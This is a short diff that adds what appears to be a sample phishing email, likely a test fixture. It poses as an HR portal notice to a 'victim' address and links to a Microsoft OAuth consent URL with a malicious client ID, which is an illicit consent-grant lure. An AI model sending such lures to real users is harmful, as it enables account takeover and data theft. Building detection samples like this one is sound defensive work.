@@ -1,0 +1,6 @@
+Subject: HR Portal Update
+From: hr@company.com
+To: victim@company.com
+
+Grant access to the new HR portal.
+<a href='https://login.microsoftonline.com/common/oauth2/authorize?client_id=malicious&prompt=consent'>Grant Access</a>
